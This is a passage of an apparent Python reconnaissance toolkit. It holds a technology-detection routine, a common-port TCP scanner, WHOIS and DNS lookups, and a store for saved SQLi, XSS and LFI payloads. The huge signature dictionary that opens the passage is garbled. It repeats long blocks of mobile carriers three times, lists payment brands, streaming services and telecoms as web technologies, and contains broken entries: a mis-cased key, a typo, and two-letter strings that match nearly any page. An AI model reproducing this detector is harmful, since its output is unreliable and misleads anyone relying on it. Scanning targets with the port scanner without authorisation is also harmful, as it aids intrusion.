                'Tableau': ['tableau'],
                'Power BI': ['power bi'],
                'Looker': ['looker'],
                'Qlik': ['qlik'],
                'MicroStrategy': ['microstrategy'],
                'Sisense': ['sisense'],
                'ThoughtSpot': ['thoughtspot'],
                'Snowflake': ['snowflake'],
                'Databricks': ['databricks'],
                'BigQuery': ['bigquery'],
                'Redshift': ['redshift'],
                'Synapse': ['synapse'],
                'Athena': ['athena'],
                'Presto': ['presto'],
                'Trino': ['trino'],
                'ClickHouse': ['clickhouse'],
                ' Druid': ['druid'],
                'Pinot': ['pinot'],
                'Cassandra': ['cassandra'],
                'ScyllaDB': ['scylladb'],
                'CockroachDB': ['cockroachdb'],
                'TiDB': ['tidb'],
                'YugabyteDB': ['yugabytedb'],
                'PlanetScale': ['planetscale'],
                'Vitess': ['vitess'],
                'ProxySQL': ['proxysql'],
                'MaxScale': ['maxscale'],
                'HAProxy': ['haproxy'],
                'NGINX': ['nginx'],
                'Apache': ['apache'],
                'IIS': ['iis'],
                'Tomcat': ['tomcat'],
                'Jetty': ['jetty'],
                'WebLogic': ['weblogic'],
                'WebSphere': ['websphere'],
                'JBoss': ['jboss'],
                'WildFly': ['wildfly'],
                'GlassFish': ['glassfish'],
                'Payara': ['payara'],
                'OpenLiberty': ['openliberty'],
                'Quarkus': ['quarkus'],
                'Micronaut': ['micronaut'],
                'Helidon': ['helidon'],
                'Ktor': ['ktor'],
                'http4k': ['http4k'],
                'Javalin': ['javalin'],
                'Spark': ['spark'],
                'Vert.x': ['vert.x'],
                'Akka': ['akka'],
                'Play': ['play'],
                'Lagom': ['lagom'],
                'Finagle': ['finagle'],
                'Finatra': ['finatra'],
                'http4s': ['http4s'],
                'ZIO HTTP': ['zio http'],
                'Tapir': ['tapir'],
                'Spring Boot': ['spring boot'],
                'Django': ['django'],
                'Flask': ['flask'],
                'FastAPI': ['fastapi'],
                'Ruby on Rails': ['ruby on rails'],
                'Laravel': ['laravel'],
                'Express': ['express'],
                'Next.js': ['next.js'],
                'Nuxt.js': ['nuxt.js'],
                'Gatsby': ['gatsby'],
                'Hugo': ['hugo'],
                'Jekyll': ['jekyll'],
                'WordPress': ['wordpress'],
                'Drupal': ['drupal'],
                'Joomla': ['joomla'],
                'Magento': ['magento'],
                'Shopify': ['shopify'],
                'BigCommerce': ['bigcommerce'],
                'WooCommerce': ['woocommerce'],
                'PrestaShop': ['prestashop'],
                'OpenCart': ['opencart'],
                'MediaWiki': ['mediawiki'],
                'Confluence': ['confluence'],
                'SharePoint': ['sharepoint'],
                'Salesforce': ['salesforce'],
                'SAP': ['sap'],
                'Oracle': ['oracle'],
                'Workday': ['workday'],
                'ServiceNow': ['servicenow'],
                'Zendesk': ['zendesk'],
                'HubSpot': ['hubspot'],
                'Marketo': ['marketo'],
                'Mailchimp': ['mailchimp'],
                'SendGrid': ['sendgrid'],
                'Twilio': ['twilio'],
                'Stripe': ['stripe'],
                'PayPal': ['paypal'],
                'Square': ['square'],
                'Adyen': ['adyen'],
                'Braintree': ['braintree'],
                'Authorize.Net': ['authorize.net'],
                '2Checkout': ['2checkout'],
                'Worldpay': ['worldpay'],
                'Ingenico': ['ingenico'],
                'FIS': ['fis'],
                'Fiserv': ['fiserv'],
                'Global Payments': ['global payments'],
                'TSYS': ['tsys'],
                'First Data': ['first data'],
                'Visa': ['visa'],
                'Mastercard': ['mastercard'],
                'American Express': ['american express'],
                'Discover': ['discover'],
                'JCB': ['jcb'],
                'Diners Club': ['diners club'],
                'UnionPay': ['unionpay'],
                'WeChat Pay': ['wechat pay'],
                'Alipay': ['alipay'],
                'Google Pay': ['google pay'],
                'Apple Pay': ['apple pay'],
                'Samsung Pay': ['samsung pay'],
                'Amazon Pay': ['amazon pay'],
                'Venmo': ['venmo'],
                'Zelle': ['zelle'],
                'Cash App': ['cash app'],
                'Paytm': ['paytm'],
                'PhonePe': ['phonepe'],
                'Google Tez': ['google tez'],
                'M-Pesa': ['m-pesa'],
                'Mercado Pago': ['mercado pago'],
                'PagSeguro': ['pagseguro'],
                'Razorpay': ['razorpay'],
                'Instamojo': ['instamojo'],
                'CCAvenue': ['ccavenue'],
                'PayU': ['payu'],
                '2C2P': ['2c2p'],
                'Omise': ['omise'],
                'Midtrans': ['midtrans'],
                'Xendit': ['xendit'],
                'Stripe': ['stripe'],
                'Klarna': ['klarna'],
                'Afterpay': ['afterpay'],
                'Affirm': ['affirm'],
                'Sezzle': ['sezzle'],
                'Quadpay': ['quadpay'],
                'Splitit': ['splitit'],
                'PayBright': ['paybright'],
                'Zip': ['zip'],
                'Humm': ['humm'],
                'Laybuy': ['laybuy'],
                'Openpay': ['openpay'],
                'LatitudePay': ['latitudepay'],
                'PayPal Credit': ['paypal credit'],
                'PayPal Pay Later': ['paypal pay later'],
                'Apple Pay Later': ['apple pay later'],
                'Google Pay Later': ['google pay later'],
                'Shop Pay': ['shop pay'],
                'Affirm': ['affirm'],
                'Bread': ['bread'],
                'ViaBill': ['viabill'],
                'Tabby': ['tabby'],
                'Tamara': ['tamara'],
                'Spotii': ['spotii'],
                'Postpay': ['postpay'],
                'Lazypay': ['lazypay'],
                'Simpl': ['simpl'],
                'ZestMoney': ['zestmoney'],
                'ePayLater': ['epaylater'],
                'Mobikwik': ['mobikwik'],
                'Freecharge': ['freecharge'],
                'PayZapp': ['payzapp'],
                'Ola Money': ['ola money'],
                'Amazon Pay Balance': ['amazon pay balance'],
                'Paytm Wallet': ['paytm wallet'],
                'PhonePe Wallet': ['phonepe wallet'],
                'Google Pay Wallet': ['google pay wallet'],
                'WhatsApp Pay': ['whatsapp pay'],
                'Facebook Pay': ['facebook pay'],
                'Instagram Checkout': ['instagram checkout'],
                'TikTok Shop': ['tiktok shop'],
                'Pinterest Shopping': ['pinterest shopping'],
                'Snapchat Shopping': ['snapchat shopping'],
                'Twitter Shop': ['twitter shop'],
                'YouTube Shopping': ['youtube shopping'],
                'Twitch Bits': ['twitch bits'],
                'Discord Nitro': ['discord nitro'],
                'Reddit Premium': ['reddit premium'],
                'Spotify Premium': ['spotify premium'],
                'Netflix': ['netflix'],
                'Amazon Prime': ['amazon prime'],
                'Disney+': ['disney+'],
                'Hulu': ['hulu'],
                'HBO Max': ['hbo max'],
                'Apple TV+': ['apple tv+'],
                'Paramount+': ['paramount+'],
                'Peacock': ['peacock'],
                'Discovery+': ['discovery+'],
                'Crunchyroll': ['crunchyroll'],
                'Funimation': ['funimation'],
                'VRV': ['vrv'],
                'Tubi': ['tubi'],
                'Pluto TV': ['pluto tv'],
                'Roku': ['roku'],
                'Sling TV': ['sling tv'],
                'FuboTV': ['fubotv'],
                'YouTube TV': ['youtube tv'],
                'Philo': ['philo'],
                'AT&T TV': ['at&t tv'],
                'Verizon Fios': ['verizon fios'],
                'Comcast Xfinity': ['comcast xfinity'],
                'Spectrum': ['spectrum'],
                'Cox': ['cox'],
                'Optimum': ['optimum'],
                'Suddenlink': ['suddenlink'],
                'Mediacom': ['mediacom'],
                'Windstream': ['windstream'],
                'Frontier': ['frontier'],
                'CenturyLink': ['centurylink'],
                'Lumen': ['lumen'],
                'Consolidated': ['consolidated'],
                'Hawaiian Telcom': ['hawaiian telcom'],
                'TDS Telecom': ['tds telecom'],
                'Ziply Fiber': ['ziply fiber'],
                'Google Fiber': ['google fiber'],
                'Starlink': ['starlink'],
                'OneWeb': ['oneweb'],
                'Amazon Kuiper': ['amazon kuiper'],
                'Telesat': ['telesat'],
                'Viasat': ['viasat'],
                'HughesNet': ['hughesnet'],
                'Inmarsat': ['inmarsat'],
                'Iridium': ['iridium'],
                'Globalstar': ['globalstar'],
                'Thuraya': ['thuraya'],
                'Intelsat': ['intelsat'],
                'SES': ['ses'],
                'Eutelsat': ['eutelsat'],
                'Astra': ['astra'],
                'Hotbird': ['hotbird'],
                'Directv': ['directv'],
                'Dish Network': ['dish network'],
                'Sky': ['sky'],
                'Virgin Media': ['virgin media'],
                'BT': ['bt'],
                'TalkTalk': ['talktalk'],
                'Vodafone': ['vodafone'],
                'Three': ['three'],
                'EE': ['ee'],
                'O2': ['o2'],
                'Orange': ['orange'],
                'Telefonica': ['telefonica'],
                'Deutsche Telekom': ['deutsche telekom'],
                'T-Mobile': ['t-mobile'],
                'Sprint': ['sprint'],
                'AT&T': ['at&t'],
                'Verizon': ['verizon'],
                'Comcast': ['comcast'],
                'Charter': ['charter'],
                'Altice': ['altice'],
                'Rogers': ['rogers'],
                'Bell': ['bell'],
                'Telus': ['telus'],
                'Shaw': ['shaw'],
                'Videotron': ['videotron'],
                'Cogeco': ['cogeco'],
                'Eastlink': ['eastlink'],
                'Telstra': ['telstra'],
                'Optus': ['optus'],
                'TPG': ['tpg'],
                'Vocus': ['vocus'],
                'Aussie Broadband': ['aussie broadband'],
                'Superloop': ['superloop'],
                'Launtel': ['launtel'],
                'Exetel': ['exetel'],
                'Dodo': ['dodo'],
                'iinet': ['iinet'],
                'Internode': ['internode'],
                'Amaysim': ['amaysim'],
                'Boost Mobile': ['boost mobile'],
                'Kogan': ['kogan'],
                'Circles.Life': ['circles.life'],
                'Gomo': ['gomo'],
                'M1': ['m1'],
                'Singtel': ['singtel'],
                'StarHub': ['starhub'],
                'MyRepublic': ['myrepublic'],
                'ViewQwest': ['viewqwest'],
                'WhizComms': ['whizcomms'],
                'Jio': ['jio'],
                'Airtel': ['airtel'],
                'Vi': ['vi'],
                'BSNL': ['bsnl'],
                'MTNL': ['mtnl'],
                'Tata Communications': ['tata communications'],
                'Reliance': ['reliance'],
                'Aircel': ['aircel'],
                'Idea': ['idea'],
                'Vodafone Idea': ['vodafone idea'],
                'Globe': ['globe'],
                'Smart': ['smart'],
                'PLDT': ['pldt'],
                'Converge': ['converge'],
                'Sky Cable': ['sky cable'],
                "Taiwan Mobile": ['taiwan mobile'],
                'Chunghwa Telecom': ['chunghwa telecom'],
                'FarEasTone': ['fareasTone'],
                'GT': ['gt'],
                'apt': ['apt'],
                'LG U+': ['lg u+'],
                'KT': ['kt'],
                'SK Telecom': ['sk telecom'],
                'Rakuten Mobile': ['rakuten mobile'],
                'SoftBank': ['softbank'],
                'NTT Docomo': ['ntt docomo'],
                'KDDI': ['kddi'],
                'au': ['au'],
                'China Mobile': ['china mobile'],
                'China Unicom': ['china unicom'],
                'China Telecom': ['china telecom'],
                'China Tower': ['china tower'],
                'China Broadnet': ['china broadnet'],
                'CITIC Telecom': ['citic telecom'],
                'True': ['true'],
                'AIS': ['ais'],
                'DTAC': ['dtac'],
                'NT': ['nt'],
                'Maxis': ['maxis'],
                'Celcom': ['celcom'],
                'Digi': ['digi'],
                'U Mobile': ['u mobile'],
                'Yes': ['yes'],
                'Unifi': ['unifi'],
                'Telkomsel': ['telkomsel'],
                'XL': ['xl'],
                'Indosat': ['indosat'],
                '3': ['3'],
                'Axis': ['axis'],
                'Smartfren': ['smartfren'],
                'Telkom': ['telkom'],
                'MyTel': ['mytel'],
                'Metfone': ['metfone'],
                'Cellcard': ['cellcard'],
                'Smart Axiata': ['smart axiata'],
                'Viettel': ['viettel'],
                'VNPT': ['vnpt'],
                'MobiFone': ['mobifone'],
                'Beeline': ['beeline'],
                'Unitel': ['unitel'],
                'Lao Telecom': ['lao telecom'],
                'ETL': ['etl'],
                'Tigo': ['tigo'],
                'Airtel Africa': ['airtel africa'],
                'MTN': ['mtn'],
                'Safaricom': ['safaricom'],
                'Vodacom': ['vodacom'],
                'Orange Africa': ['orange africa'],
                'Maroc Telecom': ['maroc telecom'],
                'Ooredoo': ['ooredoo'],
                'Zain': ['zain'],
                'STC': ['stc'],
                'Etisalat': ['etisalat'],
                'du': ['du'],
                'Batelco': ['batelco'],
                'Zain Bahrain': ['zain bahrain'],
                'Viva': ['viva'],
                'Ooredoo Kuwait': ['ooredoo kuwait'],
                'Zain Kuwait': ['zain kuwait'],
                'Ooredoo Qatar': ['ooredoo qatar'],
                'Vodafone Qatar': ['vodafone qatar'],
                'Omantel': ['omantel'],
                'Ooredoo Oman': ['ooredoo oman'],
                'Vodafone Egypt': ['vodafone egypt'],
                'Orange Egypt': ['orange egypt'],
                'Etisalat Egypt': ['etisalat egypt'],
                'WE': ['we'],
                'Turkcell': ['turkcell'],
                'Vodafone Turkey': ['vodafone turkey'],
                'Turk Telekom': ['turk telekom'],
                'Beeline Russia': ['beeline russia'],
                'MTS': ['mts'],
                'MegaFon': ['megafon'],
                'Tele2': ['tele2'],
                'Yota': ['yota'],
                'Tinkoff': ['tinkoff'],
                'Sber': ['sber'],
                'Kyivstar': ['kyivstar'],
                'Vodafone Ukraine': ['vodafone ukraine'],
                'lifecell': ['lifecell'],
                'Bakcell': ['bakcell'],
                'Azercell': ['azercell'],
                'Nar': ['nar'],
                'Geocell': ['geocell'],
                'MagtiCom': ['magticom'],
                'Ucom': ['ucom'],
                'Team': ['team'],
                'Viva-MTS': ['viva-mts'],
                'Ucom': ['ucom'],
                'Beeline Armenia': ['beeline armenia'],
                'VivaCell': ['vivacell'],
                'Ucom': ['ucom'],
                'Babilon': ['babilon'],
                'MegaFon Tajikistan': ['megafon tajikistan'],
                'Tcell': ['tcell'],
                'Beeline Kyrgyzstan': ['beeline kyrgyzstan'],
                'MegaCom': ['megacom'],
                'O!': ['o!'],
                'Beeline Uzbekistan': ['beeline uzbekistan'],
                'Ucell': ['ucell'],
                'Umobile': ['umobile'],
                'Mobiuz': ['mobiuz'],
                'Uzmobile': ['uzmobile'],
                'Kazakhtelecom': ['kazakhtelecom'],
                'Kcell': ['kcell'],
                'Tele2 Kazakhstan': ['tele2 kazakhstan'],
                'Altel': ['altel'],
                'Beeline Kazakhstan': ['beeline kazakhstan'],
                'Activ': ['activ'],
                'Kcell': ['kcell'],
                'TM Cell': ['tm cell'],
                'MTS Turkmenistan': ['mts turkmenistan'],
                'Altyn Asyr': ['altyn asyr'],
                'Acell': ['acell'],
                'Moldcell': ['moldcell'],
                'Orange Moldova': ['orange moldova'],
                'Moldtelecom': ['moldtelecom'],
                'Unitel Romania': ['unitel romania'],
                'Vodafone Romania': ['vodafone romania'],
                'Orange Romania': ['orange romania'],
                'Digi Mobil': ['digi mobil'],
                'Telekom Romania': ['telekom romania'],
                'A1 Bulgaria': ['a1 bulgaria'],
                'Telenor Bulgaria': ['telenor bulgaria'],
                'Vivacom': ['vivacom'],
                'Cosmote': ['cosmote'],
                'Vodafone Greece': ['vodafone greece'],
                'Wind': ['wind'],
                'OTE': ['ote'],
                'Cyta': ['cyta'],
                'Epic': ['epic'],
                'PrimeTel': ['primetel'],
                'Vodafone Cyprus': ['vodafone cyprus'],
                "Malta Mobile": ['malta mobile'],
                'Epic Malta': ['epic malta'],
                'GO': ['go'],
                'Melita': ['melita'],
                'Vodafone Italy': ['vodafone italy'],
                'TIM': ['tim'],
                'Wind Tre': ['wind tre'],
                'Iliad': ['iliad'],
                'Fastweb': ['fastweb'],
                'Vodafone Portugal': ['vodafone portugal'],
                'NOS': ['nos'],
                'MEO': ['meo'],
                'Digi Portugal': ['digi portugal'],
                'Movistar': ['movistar'],
                'Vodafone Spain': ['vodafone spain'],
                'Orange Spain': ['orange spain'],
                'Yoigo': ['yoigo'],
                'Digi Spain': ['digi spain'],
                'Swisscom': ['swisscom'],
                'Sunrise': ['sunrise'],
                'Salt': ['salt'],
                'A1 Austria': ['a1 austria'],
                'Magenta': ['magenta'],
                'Drei': ['drei'],
                'T-Mobile Czech': ['t-mobile czech'],
                'O2 Czech': ['o2 czech'],
                'Vodafone Czech': ['vodafone czech'],
                'T-Mobile Poland': ['t-mobile poland'],
                'Orange Poland': ['orange poland'],
                'Play': ['play'],
                'Plus': ['plus'],
                'Telenor Hungary': ['telenor hungary'],
                'Telekom Hungary': ['telekom hungary'],
                'Vodafone Hungary': ['vodafone hungary'],
                'Digi Hungary': ['digi hungary'],
                'Yettel': ['yettel'],
                'A1 Serbia': ['a1 serbia'],
                'Yettel Serbia': ['yettel serbia'],
                'Telekom Srbija': ['telekom srbija'],
                'A1 Croatia': ['a1 croatia'],
                'Tele2 Croatia': ['tele2 croatia'],
                'HT': ['ht'],
                'A1 Slovenia': ['a1 slovenia'],
                'Telemach': ['telemach'],
                'A1 Bosnia': ['a1 bosnia'],
                'HT Eronet': ['ht eronet'],
                'm:tel': ['m:tel'],
                'A1 Macedonia': ['a1 macedonia'],
                'Lycamobile': ['lycamobile'],
                'Lebara': ['lebara'],
                'Vectone': ['vectone'],
                'Talkmobile': ['talkmobile'],
                'SMARTY': ['smarty'],
                'giffgaff': ['giffgaff'],
                'Tesco Mobile': ['tesco mobile'],
                'Asda Mobile': ['asda mobile'],
                'BT Mobile': ['bt mobile'],
                'Plusnet': ['plusnet'],
                'ID Mobile': ['id mobile'],
                'Sky Mobile': ['sky mobile'],
                'Virgin Mobile': ['virgin mobile'],
                'Tracfone': ['tracfone'],
                'Metro by T-Mobile': ['metro by t-mobile'],
                'Cricket': ['cricket'],
                'Boost Mobile': ['boost mobile'],
                'Straight Talk': ['straight talk'],
                'Simple Mobile': ['simple mobile'],
                'Total Wireless': ['total wireless'],
                'Net10': ['net10'],
                'Consumer Cellular': ['consumer cellular'],
                'Mint Mobile': ['mint mobile'],
                'Ultra Mobile': ['ultra mobile'],
                'Google Fi': ['google fi'],
                'Xfinity Mobile': ['xfinity mobile'],
                'Spectrum Mobile': ['spectrum mobile'],
                'Altice Mobile': ['altice mobile'],
                'Optimum Mobile': ['optimum mobile'],
                'Cox Mobile': ['cox mobile'],
                'Credo Mobile': ['credo mobile'],
                'GreatCall': ['greatcall'],
                'Jitterbug': ['jitterbug'],
                'Gen Mobile': ['gen mobile'],
                'Hello Mobile': ['hello mobile'],
                'Tello': ['tello'],
                'TextNow': ['textnow'],
                'FreedomPop': ['freedompop'],
                'Republic Wireless': ['republic wireless'],
                'Ting': ['ting'],
                'Wing': ['wing'],
                'Reach Mobile': ['reach mobile'],
                'Pix Wireless': ['pix wireless'],
                'SpeedTalk': ['speedtalk'],
                'EasyGo': ['easygo'],
                'H2O Wireless': ['h2o wireless'],
                'Lycamobile USA': ['lycamobile usa'],
                'Ultra Mobile': ['ultra mobile'],
                'Red Pocket': ['red pocket'],
                'Unreal Mobile': ['unreal mobile'],
                'Good2Go': ['good2go'],
                'EcoMobile': ['ecomobile'],
                'Boom Mobile': ['boom mobile'],
                'Page Plus': ['page plus'],
                'Selectel Wireless': ['selectel wireless'],
                'Pure Talk': ['pure talk'],
                'Patriot Mobile': ['patriot mobile'],
                'Twigby': ['twigby'],
                'US Mobile': ['us mobile'],
                'Visible': ['visible'],
                'Xfinity Mobile': ['xfinity mobile'],
                'Spectrum Mobile': ['spectrum mobile'],
                'Altice Mobile': ['altice mobile'],
                'Optimum Mobile': ['optimum mobile'],
                'Cox Mobile': ['cox mobile'],
                'Credo Mobile': ['credo mobile'],
                'GreatCall': ['greatcall'],
                'Jitterbug': ['jitterbug'],
                'Gen Mobile': ['gen mobile'],
                'Hello Mobile': ['hello mobile'],
                'Tello': ['tello'],
                'TextNow': ['textnow'],
                'FreedomPop': ['freedompop'],
                'Republic Wireless': ['republic wireless'],
                'Ting': ['ting'],
                'Wing': ['wing'],
                'Reach Mobile': ['reach mobile'],
                'Pix Wireless': ['pix wireless'],
                'SpeedTalk': ['speedtalk'],
                'EasyGo': ['easygo'],
                'H2O Wireless': ['h2o wireless'],
                'Lycamobile USA': ['lycamobile usa'],
                'Ultra Mobile': ['ultra mobile'],
                'Red Pocket': ['red pocket'],
                'Unreal Mobile': ['unreal mobile'],
                'Good2Go': ['good2go'],
                'EcoMobile': ['ecomobile'],
                'Boom Mobile': ['boom mobile'],
                'Page Plus': ['page plus'],
                'Selectel Wireless': ['selectel wireless'],
                'Pure Talk': ['pure talk'],
                'Patriot Mobile': ['patriot mobile'],
                'Twgby': ['twigby'],
                'US Mobile': ['us mobile'],
                'Visible': ['visible'],
                'Xfinity Mobile': ['xfinity mobile'],
                'Spectrum Mobile': ['spectrum mobile'],
                'Altice Mobile': ['altice mobile'],
                'Optimum Mobile': ['optimum mobile'],
                'Cox Mobile': ['cox mobile'],
                'Credo Mobile': ['credo mobile'],
                'GreatCall': ['greatcall'],
                'Jitterbug': ['jitterbug'],
                'Gen Mobile': ['gen mobile'],
                'Hello Mobile': ['hello mobile'],
                'Tello': ['tello'],
                'TextNow': ['textnow'],
                'FreedomPop': ['freedompop'],
                'Republic Wireless': ['republic wireless'],
                'Ting': ['ting'],
                'Wing': ['wing'],
                'Reach Mobile': ['reach mobile'],
                'Pix Wireless': ['pix wireless'],
                'SpeedTalk': ['speedtalk'],
                'EasyGo': ['easygo'],
                'H2O Wireless': ['h2o wireless'],
                'Lycamobile USA': ['lycamobile usa'],
                'Ultra Mobile': ['ultra mobile'],
                'Red Pocket': ['red pocket'],
                'Unreal Mobile': ['unreal mobile'],
                'Good2Go': ['good2go'],
                'EcoMobile': ['ecomobile'],
                'Boom Mobile': ['boom mobile'],
                'Page Plus': ['page plus'],
                'Selectel Wireless': ['selectel wireless'],
                'Pure Talk': ['pure talk'],
                'Patriot Mobile': ['patriot mobile']
            }
            
            for tech, signatures in cms_signatures.items():
                for sig in signatures:
                    if sig in text or sig in str(headers).lower():
                        technologies.append((tech, sig))
                        break
            
            # Remove duplicates
            seen = set()
            unique_techs = []
            for tech, sig in technologies:
                if tech not in seen:
                    seen.add(tech)
                    unique_techs.append((tech, sig))
            
            if unique_techs:
                print(f"\n{Colors.OKGREEN}Detected Technologies:{Colors.ENDC}\n")
                for tech, sig in unique_techs:
                    print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {Colors.WHITE}{tech}{Colors.ENDC}")
            else:
                warning("No specific technologies detected")
            
            # Additional info
            print(f"\n{Colors.OKCYAN}Additional Information:{Colors.ENDC}")
            print(f"{Colors.OKGREEN}Title:{Colors.ENDC} {self._get_title(text)}")
            print(f"{Colors.OKGREEN}Meta Generator:{Colors.ENDC} {self._get_meta_generator(text) or 'N/A'}")
            
        except Exception as e:
            error(f"Detection failed: {str(e)}")
        
        press_enter()
    
    def _get_title(self, html):
        import re
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else 'N/A'
    
    def _get_meta_generator(self, html):
        import re
        match = re.search(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']*)', html, re.IGNORECASE)
        if match:
            return match.group(1)
        match = re.search(r'<meta[^>]*content=["\']([^"\']*)["\'][^>]*name=["\']generator["\']', html, re.IGNORECASE)
        return match.group(1) if match else None

    def port_scan(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ PORT SCANNER ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target IP or domain")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        # Common ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 8080, 8443, 9200, 27017]
        
        info(f"Scanning {target} for common ports...")
        print(f"{Colors.GRAY}Ports: {', '.join(map(str, common_ports))}{Colors.ENDC}\n")
        
        import socket
        found = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    service = self._get_service_name(port)
                    found.append((port, service))
                    print(f"{Colors.OKGREEN}[+] Port {port} OPEN - {service}{Colors.ENDC}")
                sock.close()
            except:
                pass
        
        if not found:
            warning("No open ports found among common ports")
        
        press_enter()
    
    def _get_service_name(self, port):
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
            8080: 'HTTP Proxy', 8443: 'HTTPS Alt', 9200: 'Elasticsearch',
            27017: 'MongoDB'
        }
        return services.get(port, 'Unknown')

    def whois_lookup(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ WHOIS LOOKUP ]{Colors.ENDC}")
        separator()
        
        domain = prompt("Enter domain")
        if not domain:
            error("No domain provided!")
            press_enter()
            return
        
        try:
            import subprocess
            result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                # Parse key info
                lines = result.stdout.split('\n')
                key_fields = ['Domain Name', 'Registrar', 'Creation Date', 'Expiration Date',
                             'Name Server', 'Registrant', 'Admin', 'Tech', 'Status']
                
                for line in lines:
                    for field in key_fields:
                        if line.lower().startswith(field.lower()):
                            print(f"{Colors.OKGREEN}{line}{Colors.ENDC}")
                
                show_all = prompt("Show full WHOIS output? (y/n)")
                if show_all.lower() == 'y':
                    print(f"\n{Colors.GRAY}{result.stdout}{Colors.ENDC}")
            else:
                error(f"WHOIS failed: {result.stderr}")
        except FileNotFoundError:
            error("whois command not found. Install whois package.")
            print(f"{Colors.OKCYAN}Try: https://who.is/{domain}{Colors.ENDC}")
        except Exception as e:
            error(f"WHOIS error: {str(e)}")
        
        press_enter()

    def dns_lookup(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ DNS LOOKUP ]{Colors.ENDC}")
        separator()
        
        domain = prompt("Enter domain")
        if not domain:
            error("No domain provided!")
            press_enter()
            return
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR']
        
        try:
            import dns.resolver
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(domain, record_type)
                    print(f"\n{Colors.OKGREEN}[{record_type} Records]{Colors.ENDC}")
                    for answer in answers:
                        print(f"{Colors.WHITE}  {answer}{Colors.ENDC}")
                except:
                    pass
                    
        except ImportError:
            # Fallback to socket
            try:
                import socket
                info(f"DNS lookup for {domain}...")
                ip = socket.gethostbyname(domain)
                print(f"{Colors.OKGREEN}A Record:{Colors.ENDC} {ip}")
                
                try:
                    ipv6 = socket.getaddrinfo(domain, None, socket.AF_INET6)
                    if ipv6:
                        print(f"{Colors.OKGREEN}AAAA Record:{Colors.ENDC} {ipv6[0][4][0]}")
                except:
                    pass
            except Exception as e:
                error(f"DNS lookup failed: {str(e)}")
        except Exception as e:
            error(f"DNS lookup failed: {str(e)}")
        
        press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# MODULE 6: CUSTOM QUERIES SAVER
# ─────────────────────────────────────────────────────────────────────────────

class CustomQueries:
    def __init__(self):
        self.queries_file = "custom_queries.json"
        self.queries = self._load_queries()
    
    def _load_queries(self):
        if os.path.exists(self.queries_file):
            try:
                with open(self.queries_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def _save_queries(self):
        with open(self.queries_file, 'w') as f:
            json.dump(self.queries, f, indent=2)
    
    def menu(self):
        while True:
            clear()
            banner()
            print(f"{Colors.OKCYAN}{Colors.BOLD}[ CUSTOM QUERIES SAVER ]{Colors.ENDC}")
            separator()
            print(f"\n{Colors.OKGREEN}Saved Queries: {len(self.queries)}{Colors.ENDC}\n")
            print(f"""
    {Colors.OKGREEN}[1]{Colors.ENDC} Add New Query
    {Colors.OKGREEN}[2]{Colors.ENDC} View All Queries
    {Colors.OKGREEN}[3]{Colors.ENDC} Search Queries
    {Colors.OKGREEN}[4]{Colors.ENDC} Edit Query
    {Colors.OKGREEN}[5]{Colors.ENDC} Delete Query
    {Colors.OKGREEN}[6]{Colors.ENDC} Export Queries
    {Colors.OKGREEN}[7]{Colors.ENDC} Import Queries
    {Colors.OKGREEN}[0]{Colors.ENDC} Back to Main Menu
            """)
            choice = prompt("Select an option")
            
            if choice == "1":
                self.add_query()
            elif choice == "2":
                self.view_queries()
            elif choice == "3":
                self.search_queries()
            elif choice == "4":
                self.edit_query()
            elif choice == "5":
                self.delete_query()
            elif choice == "6":
                self.export_queries()
            elif choice == "7":
                self.import_queries()
            elif choice == "0":
                break
            else:
                error("Invalid option!")
                time.sleep(1)
    
    def add_query(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ADD NEW QUERY ]{Colors.ENDC}")
        separator()
        
        name = prompt("Enter query name/title")
        if not name:
            error("Name is required!")
            press_enter()
            return
        
        category = prompt("Enter category (e.g., SQLi, XSS, LFI, etc.)")
        query = prompt("Enter the query/payload")
        if not query:
            error("Query is required!")
            press_enter()
            return
        
        description = prompt("Enter description (optional)")
        target = prompt("Target/Scope (optional)")
        
        self.queries[name] = {
            "category": category or "General",
            "query": query,
            "description": description,
            "target": target,
            "created": datetime.now().isoformat()
        }
        self._save_queries()
        success(f"Query '{name}' saved!")
        press_enter()
    
    def view_queries(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ALL QUERIES ]{Colors.ENDC}")
        separator()
        
        if not self.queries:
            warning("No saved queries!")
            press_enter()
            return
        
        # Group by category
        categories = {}
        for name, data in self.queries.items():
            cat = data.get("category", "General")
            if cat not in categories:
                categories[cat] = []
            categories[cat].append(name)
        
        for cat, names in sorted(categories.items()):
            print(f"\n{Colors.OKCYAN}[{cat}]{Colors.ENDC}")
            for name in sorted(names):
                print(f"  {Colors.OKGREEN}{name}{Colors.ENDC}")
        
        name = prompt("\nEnter query name to view details (or Enter to go back)")
        if name and name in self.queries:
            self._show_query_detail(name)
        
        press_enter()
    
    def _show_query_detail(self, name):
        data = self.queries[name]
        print(f"\n{Colors.OKCYAN}Name:{Colors.ENDC} {name}")
        print(f"{Colors.OKCYAN}Category:{Colors.ENDC} {data.get('category', 'General')}")
        print(f"{Colors.OKCYAN}Query:{Colors.ENDC}\n{Colors.WHITE}{data['query']}{Colors.ENDC}")
        if data.get('description'):
            print(f"\n{Colors.OKCYAN}Description:{Colors.ENDC} {data['description']}")
